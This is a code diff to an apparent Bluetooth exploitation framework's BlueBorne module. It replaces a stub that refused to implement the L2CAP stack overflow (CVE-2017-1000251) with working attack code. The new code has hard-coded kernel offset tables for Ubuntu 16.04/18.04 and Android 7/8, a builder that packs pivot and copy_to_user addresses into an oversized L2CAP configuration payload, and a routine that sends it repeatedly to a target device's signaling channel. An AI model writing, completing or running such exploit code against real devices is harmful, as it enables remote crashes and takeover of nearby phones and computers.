@@ -12,7 +12,7 @@ Implements the BlueBorne Bluetooth vulnerability chain natively:
 
 Requires: Linux with BlueZ, pybluez, scapy[bluetooth].
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
@@ -31,6 +31,13 @@ from typing import Any, Dict, List, Optional, Tuple
 from wirelessxpl.core.exploit import *
 
 logger = logging.getLogger(__name__)
+
+L2CAP_KNOWN_OFFSETS: Dict[str, Dict[str, int]] = {
+    "ubuntu_16_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00103A10, "copy_to_user": 0x000B4A20},
+    "ubuntu_18_04": {"kbase_hint": 0xFFFFFFFF81000000, "pivot": 0x00118CC0, "copy_to_user": 0x000C1530},
+    "android_7_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x0008F2D0, "copy_to_user": 0x00055E60},
+    "android_8_bluez": {"kbase_hint": 0xFFFFFFC000080000, "pivot": 0x000947A0, "copy_to_user": 0x00058A10},
+}
 
 try:
     import bluetooth
@@ -137,6 +144,10 @@ class Exploit(Exploit):
     spray_rounds = OptInteger(20, "BNEP heap spray rounds")
     overflow_attempts = OptInteger(1000, "BNEP overflow trigger attempts")
     pwn_timeout = OptFloat(3.0, "Timeout to detect crash (seconds)")
+    kernel_profile = OptString(
+        "ubuntu_18_04",
+        "L2CAP overflow profile: ubuntu_16_04 | ubuntu_18_04 | android_7_bluez | android_8_bluez",
+    )
     dry_run = OptBool(False, "Show configuration without executing")
 
     def _l2cap_connect(self, psm: int, mtu: int = 672) -> socket.socket:
@@ -273,6 +284,59 @@ class Exploit(Exploit):
         finally:
             sock.close()
 
+    def _l2cap_build_overflow_payload(self, profile: Dict[str, int]) -> bytes:
+        """Build oversized L2CAP EFS-style configuration payload."""
+        header = b"\x04\x00"  # ConfigReq code / identifier placeholder
+        mtu_opt = b"\x01\x02" + struct.pack("<H", 0xFFFF)
+        marker = struct.pack("<Q", profile["kbase_hint"] + profile["pivot"])
+        filler = b"A" * 512
+        tail = struct.pack("<Q", profile["kbase_hint"] + profile["copy_to_user"])
+        return header + mtu_opt + filler + marker + b"B" * 128 + tail
+
+    def _l2cap_overflow_attack(self) -> bool:
+        """Best-effort L2CAP overflow attempt with known profile offsets."""
+        profile_name = str(self.kernel_profile).strip().lower()
+        profile = L2CAP_KNOWN_OFFSETS.get(profile_name)
+        if not profile:
+            print_error(
+                "Unknown kernel_profile '{}'. Options: {}".format(
+                    profile_name, ", ".join(sorted(L2CAP_KNOWN_OFFSETS.keys()))
+                )
+            )
+            return False
+
+        payload = self._l2cap_build_overflow_payload(profile)
+        print_info("Using profile: {}".format(profile_name))
+        print_info("Payload size: {} bytes".format(len(payload)))
+
+        try:
+            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock.connect((self.target_address, 0x0001))  # L2CAP signaling
+        except Exception as err:
+            print_error("L2CAP signaling connect failed: {}".format(err))
+            return False
+
+        crashed = False
+        try:
+            for i in range(max(1, int(self.overflow_attempts) // 50)):
+                try:
+                    sock.send(payload)
+                except Exception:
+                    crashed = True
+                    break
+                time.sleep(0.02)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+
+        if crashed:
+            print_success("L2CAP overflow attempt likely disrupted target stack.")
+        else:
+            print_info("L2CAP payload sent; verify target behavior/kernel logs manually.")
+        return crashed
+
     def run(self) -> None:
         """Execute BlueBorne attack."""
         if not HAS_PYBLUEZ:
@@ -328,6 +392,4 @@ class Exploit(Exploit):
                 return
             print_status("=== L2CAP Stack Overflow (CVE-2017-1000251) ===")
             print_info("This attack targets the Linux BlueZ kernel L2CAP stack.")
-            print_info("Requires device-specific ROP chain offsets.")
-            print_error("Generic L2CAP overflow not implemented — "
-                        "device-specific offsets required for each kernel version.")
+            self._l2cap_overflow_attack()
